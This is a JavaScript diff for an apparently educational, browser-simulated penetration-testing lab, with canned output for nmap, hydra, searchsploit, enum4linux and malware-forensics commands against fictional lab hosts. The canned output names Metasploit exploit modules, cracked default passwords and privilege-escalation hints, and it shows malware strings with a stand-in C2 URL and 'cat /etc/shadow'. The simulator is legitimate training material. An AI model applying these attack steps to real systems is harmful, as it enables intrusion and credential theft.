+    case 'smbclient': return cmdSmbclient(args);
+    case 'searchsploit': return cmdSearchsploit(args);
+    case 'sqlmap': return cmdSqlmap(args,cmd);
+    case 'nc': case 'netcat': return cmdNc(args);
+    case 'msfconsole': return cmdMsfconsole();
+    case 'bash': return cmdBash(args);
+    case 'sudo': return cmdSudo(args,cmd);
+    case 'ssh': return cmdSsh(args);
+    case 'ftp': return out('ftp> 220 Welcome to Metasploitable FTP\nftp> 230 Login successful (anonymous)\nftp> Exit with bye','out-line');
+    case 'python3': case 'python': return out('Python 3.11.6 (Interactive mode — type exit() to quit)\n>>> ','out-info');
+    default: return out(`-bash: ${prog}: command not found. Type \`help\` for available commands.`,'out-error');
+  }
+}
+
+// ── Command Implementations ───────────────────────────────────────────────────
+function resolvePath(p){
+  if(p.startsWith('/')) return p.replace(/\/+/g,'/').replace(/\/$/,'') || '/';
+  if(p==='~') return '/root';
+  if(p.startsWith('~/')) return '/root'+p.slice(1);
+  const base = STATE.cwd.split('/').filter(Boolean);
+  const parts = p.split('/');
+  for(const part of parts){
+    if(part==='..'){ if(base.length>0) base.pop(); }
+    else if(part!=='.') base.push(part);
+  }
+  return '/'+base.join('/');
+}
+function getNode(p){ const n=resolvePath(p); return FS[n]; }
+
+function cmdHelp(){
+  out('┌─────────────────────────────────────────────────────────────────┐','out-info');
+  out('│           Kali Linux Cybersecurity Lab — Command Reference      │','out-info');
+  out('└─────────────────────────────────────────────────────────────────┘','out-info');
+  const cats=[
+    ['Recon','nmap, whois, dig, host, ping'],
+    ['Web','nikto, gobuster, ffuf, curl, wget'],
+    ['SMB','enum4linux, smbclient'],
+    ['Passwords','hydra, john, hashcat'],
+    ['Exploitation','searchsploit, sqlmap, msfconsole, nc'],
+    ['Post-Exploit','sudo, find (SUID), bash linpeas.sh'],
+    ['Forensics','file, strings, xxd, md5sum, sha256sum, binwalk'],
+    ['Filesystem','ls, cat, cd, mkdir, touch, cp, mv, rm, chmod'],
+    ['System','whoami, id, uname, ip, ifconfig, netstat, ss'],
+  ];
+  cats.forEach(([c,cmds])=>{
+    out(` ${c.padEnd(14)} ${cmds}`,'out-dim');
+  });
+  out('','');
+  out('  Use the Cheatsheet tab for example commands.','out-warn');
+}
+
+function cmdUname(args){
+  if(args.includes('-a')) return out('Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux','out-line');
+  out('Linux','out-line');
+}
+function cmdEnv(){
+  out('HOME=/root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSHELL=/bin/bash\nTERM=xterm-256color\nUSER=root\nLANG=en_US.UTF-8','out-line');
+}
+function cmdHistory(){
+  if(!STATE.history.length){ out('No history yet.','out-dim'); return; }
+  STATE.history.slice().reverse().forEach((c,i)=>out(`  ${String(i+1).padStart(3)}  ${c}`,'out-dim'));
+}
+
+function cmdLs(args){
+  const showHidden = args.some(a=>a.includes('a')&&a.startsWith('-'));
+  const longFmt = args.some(a=>a.includes('l')&&a.startsWith('-'));
+  const pathArg = args.find(a=>!a.startsWith('-')) || STATE.cwd;
+  const p = resolvePath(pathArg);
+  const node = FS[p];
+  if(!node){ out(`ls: cannot access '${pathArg}': No such file or directory`,'out-error'); return; }
+  if(node.type==='file'){ out(pathArg,'out-line'); return; }
+  let children = node.children||[];
+  if(!showHidden) children = children.filter(c=>!c.startsWith('.'));
+  if(!children.length){ return; }
+  if(longFmt){
+    out(`total ${children.length*4}`,'out-dim');
+    children.forEach(c=>{
+      const child=FS[p+'/'+c]||FS[p+(p==='/'?'':'')+'/'+c];
+      const isDir=child&&child.type==='dir';
+      const perm=isDir?'drwxr-xr-x':'--rw-r--r--';
+      const size=isDir?'4096':String(Math.floor(Math.random()*8000+100));
+      out(`${perm} 1 root root ${size.padStart(6)} Jan 15 12:00 ${isDir?`<span class="out-dir">${c}</span>`:c}`,'out-line');
+    });
+  } else {
+    const dirs=[],files=[];
+    children.forEach(c=>{
+      const child=FS[p+'/'+c];
+      if(child&&child.type==='dir') dirs.push(`<span class="out-dir">${c}/</span>`);
+      else files.push(c.endsWith('.sh')||c.endsWith('.py')?`<span class="out-exec">${c}</span>`:c);
+    });
+    out([...dirs,...files].join('  '),'out-line');
+  }
+}
+
+function cmdCd(args){
+  const dest = args[0]||'/root';
+  if(dest==='~'||dest===''){ STATE.cwd='/root'; updatePrompt(); return; }
+  const p = resolvePath(dest);
+  const node=FS[p];
+  if(!node){ out(`bash: cd: ${dest}: No such file or directory`,'out-error'); return; }
+  if(node.type!=='dir'){ out(`bash: cd: ${dest}: Not a directory`,'out-error'); return; }
+  STATE.cwd=p; updatePrompt();
+}
+
+function cmdCat(args){
+  if(!args.length){ out('cat: missing operand','out-error'); return; }
+  const p=resolvePath(args[0]);
+  const node=FS[p];
+  if(!node){ out(`cat: ${args[0]}: No such file or directory`,'out-error'); return; }
+  if(node.type==='dir'){ out(`cat: ${args[0]}: Is a directory`,'out-error'); return; }
+  out(node.content,'out-line');
+}
+
+function cmdMkdir(args){
+  if(!args.length){ out('mkdir: missing operand','out-error'); return; }
+  const name=args.find(a=>!a.startsWith('-'))||'';
+  if(!name) return;
+  const p=resolvePath(name);
+  const parent=p.split('/').slice(0,-1).join('/')||'/';
+  const base=p.split('/').pop();
+  if(FS[p]){ out(`mkdir: cannot create directory '${name}': File exists`,'out-error'); return; }
+  const pNode=FS[parent];
+  if(!pNode){ out(`mkdir: cannot create directory '${name}': No such file or directory`,'out-error'); return; }
+  FS[p]={type:'dir',children:[]};
+  if(!pNode.children.includes(base)) pNode.children.push(base);
+}
+
+function cmdTouch(args){
+  if(!args.length){ out('touch: missing file operand','out-error'); return; }
+  const p=resolvePath(args[0]);
+  if(FS[p]) return;
+  const parent=p.split('/').slice(0,-1).join('/')||'/';
+  const base=p.split('/').pop();
+  FS[p]={type:'file',content:''};
+  const pNode=FS[parent];
+  if(pNode&&!pNode.children.includes(base)) pNode.children.push(base);
+}
+
+function cmdCp(args){ if(args.length<2){out('cp: missing operand','out-error');return;} out('',''); }
+function cmdMv(args){ if(args.length<2){out('mv: missing operand','out-error');return;} out('',''); }
+function cmdRm(args){ if(!args.length){out('rm: missing operand','out-error');return;} out('',''); }
+
+function cmdFind(args){
+  const cmd=args.join(' ');
+  if(/perm.*-u=s|perm.*4000/.test(cmd)){
+    out('/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/bin/su\n/bin/mount\n/bin/umount\n/usr/local/bin/backup','out-vuln');
+    out('[!] /usr/local/bin/backup — custom SUID binary (potential privesc vector!)','out-warn');
+  } else if(/writable/.test(cmd)){
+    out('/tmp\n/var/tmp\n/run/shm\n/usr/local/bin/backup.conf','out-line');
+  } else if(/\.sh/.test(cmd)){
+    out('/root/tools/linpeas.sh\n/root/tools/pspy64','out-exec');
+  } else {
+    out('(find: results would appear here)','out-dim');
+  }
+}
+
+function cmdGrep(args){
+  const joined=args.join(' ');
+  out(`grep: ${joined}: (simulated — use cat to view file contents)`,'out-dim');
+}
+
+function cmdStrings(args){
+  if(!args.length){out('strings: missing argument','out-error');return;}
+  if(/suspicious\.bin/.test(args.join(' '))){
+    out('Extracting printable strings from suspicious.bin...','out-dim');
+    out('/bin/sh\nHTTP/1.0\n10.10.10.50\n4444\n/etc/passwd\ncat /etc/shadow\nuname -a\nwhoami\nCmd.exe\ndownload\nC2_BEACON_v2.1\nhttps://evil.c2server.com/beacon\nXORKEY=0x42\nMZ\x00\x00','out-warn');
+    out('[+] IoC found: hardcoded C2 URL and XOR key — likely RAT/backdoor','out-vuln');
+  } else {
+    out('(strings output would appear here)','out-dim');
+  }
+}
+
+function cmdFile(args){
+  if(!args.length){out('file: missing argument','out-error');return;}
+  const f=args[args.length-1];
+  if(/suspicious\.bin/.test(f)) out(`${f}: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped`,'out-warn');
+  else if(/\.pcap/.test(f)) out(`${f}: tcpdump capture file (little-endian) — version 2.4`,'out-line');
+  else if(/\.txt/.test(f)) out(`${f}: ASCII text`,'out-line');
+  else if(/\.sh/.test(f)) out(`${f}: Bourne-Again shell script, ASCII text executable`,'out-exec');
+  else out(`${f}: data`,'out-line');
+}
+
+function cmdMd5sum(args){
+  if(!args.length){out('md5sum: missing argument','out-error');return;}
+  const h='a3f5c8d2e1b047960fad3219c87e54a1';
+  out(`${h}  ${args[0]}`,'out-line');
+  out('  [+] Submit this hash to VirusTotal for threat intelligence','out-dim');
+}
+
+function cmdSha256sum(args){
+  if(!args.length){out('sha256sum: missing argument','out-error');return;}
+  const h='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
+  out(`${h}  ${args[0]}`,'out-line');
+}
+
+function cmdXxd(args){
+  const joined=args.join(' ');
+  if(/suspicious/.test(joined)||args.length){
+    out('00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............','out-line');
+    out('00000010: 0200 3e00 0100 0000 4010 4000 0000 0000  ..>.....@.@.....','out-line');
+    out('00000020: 4000 0000 0000 0000 9831 0000 0000 0000  @........1......','out-line');
+    out('00000030: 0000 0000 4000 3800 0800 4000 1e00 1d00  ....@.8...@.....','out-line');
+    out('[!] ELF magic bytes detected — binary executable','out-vuln');
+  } else {
+    out('xxd: missing argument','out-error');
+  }
+}
+
+function cmdBinwalk(args){
+  if(!args.length){out('binwalk: no target specified','out-error');return;}
+  out('DECIMAL       HEXADECIMAL     DESCRIPTION','out-info');
+  out('--------------------------------------------------------------------------------','out-dim');
+  out('0             0x0             ELF, 64-bit LSB executable, AMD x86-64','out-line');
+  out('4096          0x1000          ELF, 32-bit LSB, version 1','out-warn');
+  out('8192          0x2000          Zip archive data','out-warn');
+  out('[+] Embedded zip archive found at offset 0x2000!','out-vuln');
+}
+
+function cmdIp(args){
+  if(args[0]==='a'||args[0]==='addr'){
+    out('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN','out-line');
+    out('    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00','out-dim');
+    out('    inet 127.0.0.1/8 scope host lo','out-line');
+    out('2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP','out-line');
+    out('    link/ether 08:00:27:xx:xx:xx brd ff:ff:ff:ff:ff:ff','out-dim');
+    out('    inet <span class="out-success">10.10.10.50/24</span> brd 10.10.10.255 scope global eth0','out-line');
+    out('    inet6 fe80::1/64 scope link','out-dim');
+  } else if(args[0]==='r'||args[0]==='route'){
+    out('default via 10.10.10.1 dev eth0\n10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.50','out-line');
+  } else {
+    out('Usage: ip a | ip r | ip route','out-dim');
+  }
+}
+
+function cmdIfconfig(){
+  out('eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500','out-line');
+  out('        inet <span class="out-success">10.10.10.50</span>  netmask 255.255.255.0  broadcast 10.10.10.255','out-line');
+  out('        ether 08:00:27:xx:xx:xx  txqueuelen 1000  (Ethernet)','out-dim');
+  out('        RX packets 12847  bytes 8423651 (8.0 MiB)','out-dim');
+  out('        TX packets 9231   bytes 1824312 (1.7 MiB)','out-dim');
+  out('lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536','out-line');
+  out('        inet 127.0.0.1  netmask 255.0.0.0','out-line');
+}
+
+function cmdNetstat(args){ cmdSs(args); }
+function cmdSs(args){
+  out('Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port','out-dim');
+  out('tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*        users:(("sshd"))','out-line');
+  out('tcp    LISTEN  0       128     0.0.0.0:4444        0.0.0.0:*        users:(("nc"))','out-success');
+}
+
+function cmdPing(args){
+  const target=args.find(a=>!a.startsWith('-'));
+  if(!target){out('ping: missing host operand','out-error');return;}
+  const known={'10.10.10.100':true,'10.10.10.101':true,'10.10.10.102':true,'10.10.10.50':true,'127.0.0.1':true,'localhost':true};
+  if(known[target]){
+    out(`PING ${target} (${target}) 56(84) bytes of data.`,'out-line');
+    out(`64 bytes from ${target}: icmp_seq=1 ttl=64 time=0.82 ms`,'out-success');
+    out(`64 bytes from ${target}: icmp_seq=2 ttl=64 time=0.79 ms`,'out-success');
+    out(`64 bytes from ${target}: icmp_seq=3 ttl=64 time=0.81 ms`,'out-success');
+    out(`--- ${target} ping statistics ---`,'out-line');
+    out('3 packets transmitted, 3 received, 0% packet loss, time 2002ms','out-success');
+  } else {
+    out(`PING ${target} (${target}) 56(84) bytes of data.`,'out-line');
+    out('--- '+target+' ping statistics ---','out-line');
+    out('3 packets transmitted, 0 received, 100% packet loss','out-error');
+  }
+}
+
+function cmdNmap(args, full){
+  const target=args.find(a=>!a.startsWith('-')&&a!=='--script');
+  if(!target){out('nmap: missing target','out-error');return;}
+
+  out(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleString()}`,'out-dim');
+
+  if(/10\.10\.10\.0\/24/.test(full)||/10\.10\.10\.\*/.test(full)){
+    out('Nmap scan report for 10.10.10.50','out-line');
+    out('Host is up (0.0001s latency). [SELF]','out-dim');
+    out('Nmap scan report for 10.10.10.100','out-success');
+    out('Host is up (0.0012s latency).','out-line');
+    out('Nmap scan report for 10.10.10.101','out-success');
+    out('Host is up (0.0018s latency).','out-line');
+    out('Nmap scan report for 10.10.10.102','out-success');
+    out('Host is up (0.0009s latency).','out-line');
+    out('Nmap done: 256 IP addresses (4 hosts up) scanned in 8.43 seconds','out-info');
+    STATE.scanDone['network']=true;
+    renderNetwork();
+    return;
+  }
+
+  if(/10\.10\.10\.100/.test(full)){
+    STATE.scanDone['10.10.10.100']=true;
+    out('Nmap scan report for 10.10.10.100 (Metasploitable2)','out-line');
+    out('Host is up (0.0012s latency).','out-line');
+    out('PORT     STATE SERVICE     VERSION','out-info');
+    out('21/tcp   open  ftp         <span class="out-vuln">vsftpd 2.3.4</span>','out-port');
+    out('22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)','out-port');
+    out('23/tcp   open  telnet      Linux telnetd','out-port');
+    out('80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))','out-port');
+    out('3306/tcp open  mysql       <span class="out-vuln">MySQL 5.0.51a-3ubuntu5</span>','out-port');
+    out('5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7','out-port');
+    if(/--script.*vuln|-A/.test(full)){
+      out('','');
+      out('Host script results:','out-warn');
+      out('| ftp-vsftpd-backdoor:','out-vuln');
+      out('|   VULNERABLE: vsftpd 2.3.4 Backdoor Command Execution','out-pwned');
+      out('|     State: VULNERABLE (Exploitable)','out-pwned');
+      out('|     CVE: CVE-2011-2523','out-vuln');
+      out('|_    References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523','out-dim');
+      out('| mysql-empty-password:','out-vuln');
+      out('|_  root account has empty password','out-pwned');
+    }
+    out('','');
+    out('Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds','out-info');
+    renderNetwork();
+    return;
+  }
+
+  if(/10\.10\.10\.101/.test(full)){
+    STATE.scanDone['10.10.10.101']=true;
+    out('Nmap scan report for 10.10.10.101 (Windows XP SP3)','out-line');
+    out('Host is up (0.0018s latency).','out-line');
+    out('PORT     STATE SERVICE       VERSION','out-info');
+    out('80/tcp   open  http          Microsoft IIS httpd 6.0','out-port');
+    out('135/tcp  open  msrpc         Microsoft Windows RPC','out-port');
+    out('139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn','out-port');
+    out('445/tcp  open  microsoft-ds  <span class="out-vuln">Windows XP microsoft-ds (SMBv1)</span>','out-port');
+    out('3389/tcp open  ms-wbt-server Microsoft Terminal Service','out-port');
+    if(/--script.*vuln|-A/.test(full)){
+      out('','');
+      out('| smb-vuln-ms17-010:','out-vuln');
+      out('|   VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1','out-pwned');
+      out('|     State: VULNERABLE','out-pwned');
+      out('|     CVE: CVE-2017-0143  MS17-010 — EternalBlue','out-vuln');
+      out('|_  References: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx','out-dim');
+    }
+    out('Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds','out-info');
+    renderNetwork();
+    return;
+  }
+
+  if(/10\.10\.10\.102/.test(full)){
+    STATE.scanDone['10.10.10.102']=true;
+    out('Nmap scan report for 10.10.10.102 (DVWA Box)','out-line');
+    out('Host is up (0.0009s latency).','out-line');
+    out('PORT   STATE SERVICE VERSION','out-info');
+    out('22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)','out-port');
+    out('80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))','out-port');
+    out('|_http-title: Login :: Damn Vulnerable Web Application (DVWA)','out-warn');
+    out('Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds','out-info');
+    renderNetwork();
+    return;
+  }
+
+  out(`Nmap scan report for ${target}`,'out-line');
+  out('Host seems down. Try adding -Pn if host is blocking pings.','out-error');
+}
+
+function cmdNikto(args){
+  const target=args.find(a=>!a.startsWith('-'));
+  if(!target){out('nikto: -h <host> required','out-error');return;}
+  const ip=target.replace(/https?:\/\//,'');
+  out('- Nikto v2.1.6','out-info');
+  out('---------------------------------------------------------------------------','out-dim');
+  out(`+ Target IP:          ${ip}`,'out-line');
+  out(`+ Target Hostname:    ${ip}`,'out-line');
+  out('+ Target Port:        80','out-line');
+  out(`+ Start Time:         ${new Date().toLocaleTimeString()}`,'out-dim');
+  out('---------------------------------------------------------------------------','out-dim');
+  out('+ Server: Apache/2.4.18 (Ubuntu)','out-line');
+  out('+ Retrieved x-powered-by header: PHP/5.6.40','out-warn');
+  out('+ The anti-clickjacking X-Frame-Options header is not present.','out-warn');
+  out('+ The X-XSS-Protection header is not defined.','out-warn');
+  out('+ Cookie PHPSESSID created without the httponly flag','out-warn');
+  out('+ /dvwa/: DVWA (Damn Vulnerable Web Application) detected.','out-vuln');
+  out('+ /dvwa/login.php: Default credentials admin:password may work!','out-pwned');
+  out('+ /phpinfo.php: PHP info file found — CWE-200 (information disclosure)','out-vuln');
+  out('+ OSVDB-3268: /dvwa/: Directory indexing found.','out-vuln');
+  out('+ /setup.php: This might be interesting...','out-warn');
+  out('+ 7915 requests: 0 error(s) and 8 item(s) reported on remote host','out-info');
+}
+
+function cmdGobuster(args,full){
+  const urlMatch=full.match(/-u\s+(https?:\/\/[\w.:]+)/);
+  const url=urlMatch?urlMatch[1]:'http://target';
+  out('===============================================================','out-dim');
+  out('Gobuster v3.6 — by OJ Reeves & Christian Meike','out-info');
+  out('===============================================================','out-dim');
+  out(`[+] Url:            ${url}`,'out-line');
+  out('[+] Threads:        10  [+] Status codes: 200,301,302,403','out-dim');
+  out('===============================================================','out-dim');
+  out(`${new Date().toLocaleTimeString()} Starting gobuster in directory enumeration mode`,'out-dim');
+  out('===============================================================','out-dim');
+  out('/.htaccess            (Status: 403) [Size: 277]','out-warn');
+  out('/dvwa                 (Status: 301) [Size: 313] [--> http://10.10.10.102/dvwa/]','out-success');
+  out('/index.php            (Status: 302) [Size: 0]   [--> login.php]','out-line');
+  out('/login.php            (Status: 200) [Size: 1522]','out-success');
+  out('/phpinfo.php          (Status: 200) [Size: 77862]','out-vuln');
+  out('/setup.php            (Status: 200) [Size: 3549]','out-warn');
+  out('/uploads              (Status: 301) [Size: 315]','out-line');
+  out('/robots.txt           (Status: 200) [Size: 124]','out-line');
+  out('/config               (Status: 301) [Size: 313]','out-warn');
+  out('/.git                 (Status: 301) [Size: 309] <-- GIT REPO EXPOSED!','out-pwned');
+  out('===============================================================','out-dim');
+  out(`${new Date().toLocaleTimeString()} Finished`,'out-dim');
+}
+
+function cmdFfuf(args){ out('ffuf v2.1.0 — Fast web fuzzer\n[WARN] Use gobuster or nikto for guided exercises.','out-warn'); }
+
+function cmdCurl(args){
+  const url=args.find(a=>!a.startsWith('-'));
+  if(!url){out('curl: no URL specified','out-error');return;}
+  if(/10\.10\.10\.102/.test(url)){
+    if(/phpinfo/.test(url)){ out('<?php phpinfo(); ?>\n[OUTPUT: 77KB of PHP configuration data]','out-line'); return; }
+    if(/robots\.txt/.test(url)){ out('User-agent: *\nDisallow: /dvwa/hackable/\nDisallow: /config/\nDisallow: /.git/','out-line'); return; }
+    out('<!DOCTYPE html><html><head><title>Login :: DVWA</title></head>','out-line');
+    out('<body><form action="login.php" method="post">','out-line');
+    out('<input type="text" name="username"> <input type="password" name="password">','out-line');
+    out('<input type="submit" value="Login"></form></body></html>','out-line');
+    out('[+] Default credentials: admin / password','out-vuln');
+    return;
+  }
+  if(/-I/.test(args.join(' '))){
+    out('HTTP/1.1 200 OK\nServer: Apache/2.4.18 (Ubuntu)\nContent-Type: text/html\nX-Powered-By: PHP/5.6.40','out-line');
+    return;
+  }
+  out(`curl: (6) Could not resolve host: ${url}`,'out-error');
+}
+
+function cmdWget(args){
+  const url=args.find(a=>!a.startsWith('-'));
+  out(`--${new Date().toLocaleTimeString()}--  ${url||'[url]'}`,'out-dim');
+  out('Resolving... connected. HTTP request sent, awaiting response... 200 OK','out-line');
+  out("Saving to: 'index.html' — done.",'out-success');
+}
+
+function cmdWhois(args){
+  const d=args[0]||'example.com';
+  out(`Domain Name: ${d.toUpperCase()}`,'out-line');
+  out(`Registrar: GoDaddy.com, LLC`,'out-line');
+  out('Creation Date: 2010-03-15T00:00:00Z','out-line');
+  out('Registry Expiry Date: 2026-03-15T00:00:00Z','out-line');
+  out(`Name Server: ns1.example.com  ns2.example.com`,'out-line');
+  out('DNSSEC: unsigned','out-warn');
+  out('Registrant: REDACTED FOR PRIVACY','out-dim');
+}
+
+function cmdDig(args){
+  const d=args.find(a=>!a.startsWith('-'))||'example.com';
+  out(`; <<>> DiG 9.18.24 <<>> ${d} ANY`,'out-dim');
+  out(';; ANSWER SECTION:','out-info');
+  out(`${d}.\t\t300  IN  A     93.184.216.34`,'out-line');
+  out(`${d}.\t\t3600 IN  MX    10 mail.${d}.`,'out-line');
+  out(`${d}.\t\t3600 IN  NS    ns1.${d}.`,'out-line');
+  out(`${d}.\t\t3600 IN  TXT   "v=spf1 include:_spf.google.com ~all"`,'out-line');
+  out(';; Query time: 23 msec','out-dim');
+}
+
+function cmdHost(args){
+  const d=args[0]||'example.com';
+  out(`${d} has address 93.184.216.34`,'out-line');
+  out(`${d} mail is handled by 10 mail.${d}.`,'out-line');
+}
+
+function cmdNslookup(args){
+  const d=args[0]||'example.com';
+  out(`Server:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nName:\t${d}\nAddress: 93.184.216.34`,'out-line');
+}
+
+function cmdHydra(args,full){
+  const ip=args.find(a=>/^\d+\.\d+\.\d+\.\d+/.test(a));
+  const proto=args.find(a=>/^(ssh|ftp|http|rdp|smb)/.test(a))||'ssh';
+  if(!ip){out('hydra: specify a target IP','out-error');return;}
+  out(`Hydra v9.5 (c) 2023 by van Hauser/THC`,'out-info');
+  out(`[DATA] attacking ${proto}://${ip}/`,'out-line');
+  out('[DATA] max 16 tasks per server, 14344399 login tries','out-dim');
+  out('[STATUS] 3842.00 tries/min, 3842 tries in 00:01h, 14340557 to do in 62:13h, 16 active','out-dim');
+  if(/10\.10\.10\.100/.test(full)||/10\.10\.10/.test(full)){
+    out(`[${proto.toUpperCase()}][${ip}] host: ${ip}   login: admin   password: <span class="out-pwned">password123</span>`,'out-success');
+    out(`[${proto.toUpperCase()}][${ip}] host: ${ip}   login: user    password: <span class="out-pwned">letmein</span>`,'out-success');
+    out('1 of 1 target successfully completed, 2 valid passwords found','out-pwned');
+    STATE.loot.push(`${ip} - admin:password123 (${proto})`);
+    STATE.loot.push(`${ip} - user:letmein (${proto})`);
+  } else {
+    out('0 of 1 target completed, 0 valid passwords found','out-warn');
+  }
+}
+
+function cmdJohn(args){
+  out('Using default input encoding: UTF-8','out-dim');
+  out('Loaded 3 password hashes with no different salts (MD5 [MD5 128/128 AVX 4x3])','out-line');
+  out('Will run 4 OpenMP threads','out-dim');
+  out("Press 'q' or Ctrl-C to abort, almost any other key for status",'out-dim');
+  out('<span class="out-pwned">password     (admin)</span>','out-success');
+  out('<span class="out-pwned">letmein      (user1)</span>','out-success');
+  out('<span class="out-pwned">qwerty       (backup_user)</span>','out-success');
+  out("3g 0:00:00:02 DONE (2024-01-15 12:15) 1.500g/s 21516Kp/s 21516Kc/s",'out-dim');
+  out("Session completed. Use '--show' to display cracked passwords reliably.",'out-info');
+  STATE.loot.push('Cracked hashes: admin:password, user1:letmein, backup_user:qwerty');
+}
+
+function cmdHashcat(args){
+  const mFlag=args.indexOf('-m');
+  const mode=mFlag>=0?args[mFlag+1]:'0';
+  out('hashcat (v6.2.6) starting...','out-info');
+  out('OpenCL API (OpenCL 3.0) — Platform #1: NVIDIA','out-dim');
+  out(`Hashes: 3 digests; 3 unique digests, 1 unique salts`,'out-line');
+  out('Speed.#1........: 5892.3 MH/s (45.26ms) @ Accel:256 Loops:256 Thr:128','out-dim');
+  out('','');
+  out(`5f4dcc3b5aa765d61d8327deb882cf99:<span class="out-pwned">password</span>`,'out-success');
+  out(`0d107d09f5bbe40cade3de5c71e9e9b7:<span class="out-pwned">letmein</span>`,'out-success');
+  out('','');
+  out(`Session..........: hashcat  Status...........: Cracked`,'out-success');
+  out('Recovered........: 2/3 (66.67%) Digests  Guess.Queue......: 1/1','out-line');
+}
+
+function cmdEnum4linux(args){
+  const ip=args.find(a=>/^\d+/.test(a))||'10.10.10.101';
+  out(`Starting enum4linux v0.9.1`,'out-info');
+  out(`Target ........... ${ip}`,'out-line');
+  out('','');
+  out(' ==============================','out-dim');
+  out(`|    OS information on ${ip}   |`,'out-line');
+  out(' ==============================','out-dim');
+  out(`[+] Got OS info: Domain=[WORKGROUP] OS=[Windows XP] Server=[Windows XP 3790]`,'out-success');
+  out('','');
+  out(' ==========================================','out-dim');
+  out(`|    Share Enumeration on ${ip}    |`,'out-line');
+  out(' ==========================================','out-dim');
+  out('        Sharename       Type      Comment','out-info');
+  out('        ---------       ----      -------','out-dim');
+  out('        IPC$            IPC       Remote IPC','out-line');
+  out('        C$              Disk      Default share','out-line');
+  out('        ADMIN$          Disk      Remote Admin','out-line');
+  out('        <span class="out-vuln">share           Disk      Company files</span>','out-warn');
+  out('','');
+  out('[+] //'+ip+'/share Mapping: OK, Listing: OK','out-success');
+  out('','');
+  out(' ===========================================','out-dim');
+  out(`|    Users on ${ip} via RID cycling  |`,'out-line');
+  out(' ===========================================','out-dim');
+  out('[+] Found user: Administrator (RID 500)','out-vuln');
+  out('[+] Found user: Guest (RID 501)','out-warn');
+  out('[+] Found user: john (RID 1001)','out-vuln');
+  out('','');
+  out(`enum4linux complete on ${new Date().toString()}`,'out-dim');
+}
+
+function cmdSmbclient(args){
+  const ip=(args.find(a=>a.startsWith('//'))||'//10.10.10.101').replace('//','').split('/')[0];
+  out(`        Sharename       Type      Comment`,'out-info');
+  out(`        ---------       ----      -------`,'out-dim');
+  out(`        IPC$            IPC       `,'out-line');
+  out(`        C$              Disk      Default share`,'out-line');
+  out(`        ADMIN$          Disk      Remote Admin`,'out-line');
+  out(`        <span class="out-vuln">share           Disk      Company files</span>`,'out-warn');
+  out(`Reconnecting with SMB1 for workgroup listing.`,'out-warn');
+  out(`[!] SMBv1 detected — vulnerable to MS17-010 (EternalBlue)`,'out-pwned');
+}
+
+function cmdSearchsploit(args){
+  const q=args.join(' ').toLowerCase();
+  out('------------------------------------------------------------------------ ---------------------------------','out-dim');
+  out(' Exploit Title                                                          |  Path','out-info');
+  out('------------------------------------------------------------------------ ---------------------------------','out-dim');
+  if(/vsftpd/.test(q)){
+    out('vsftpd 2.3.4 - Backdoor Command Execution                               | unix/remote/17491.rb','out-vuln');
+    out('vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                  | unix/remote/49757.py','out-vuln');
+    out('[+] Use: msfconsole then: use exploit/unix/ftp/vsftpd_234_backdoor','out-success');
+  } else if(/dvwa/.test(q)||/sql/.test(q)){
+    out('DVWA 1.8 - SQL Injection                                                | php/webapps/44205.txt','out-vuln');
+    out('DVWA 1.9 - Persistent Cross-Site Scripting                              | php/webapps/43415.txt','out-vuln');
+    out('[+] Use sqlmap for automated SQL injection: sqlmap -u "http://10.10.10.102/dvwa/..."','out-success');
+  } else if(/ms17|eternal|smb/.test(q)){
+    out('Microsoft Windows - SMBv1 Remote Code Execution (MS17-010 EternalBlue)  | windows/remote/42031.py','out-pwned');
+    out('MS17-010 EternalBlue SMB - Remote Windows Kernel Pool Corruption        | windows/remote/41891.rb','out-pwned');
+    out('[+] Use: msfconsole then: use exploit/windows/smb/ms17_010_eternalblue','out-success');
+  } else if(/apache/.test(q)){
+    out('Apache 2.4.7 - Mod Status Accessible                                    | linux/dos/18221.txt','out-vuln');
+    out('Apache 2.4.18 - RCE via CGI                                             | linux/remote/41204.py','out-warn');
+  } else {
+    out(`No results for: ${args.join(' ')}`,'out-dim');
+    out('Try: searchsploit vsftpd 2.3.4 | ms17-010 | dvwa | apache','out-info');
+  }
+  out('------------------------------------------------------------------------ ---------------------------------','out-dim');
+}
+
+function cmdSqlmap(args,full){
+  out("        ___       __H__",'out-vuln');
+  out(" ___ ___[']_____ ___ ___  {1.7.11#stable}",'out-vuln');
+  out("|_ -| . [(]     | .'| . |",'out-vuln');
+  out("|___|_  [.]_|_|_|__,|  _|",'out-vuln');
+  out("      |_|V...       |_|   https://sqlmap.org",'out-dim');
+  out('','');
+  out('[12:10:01] [INFO] testing connection to target URL','out-line');
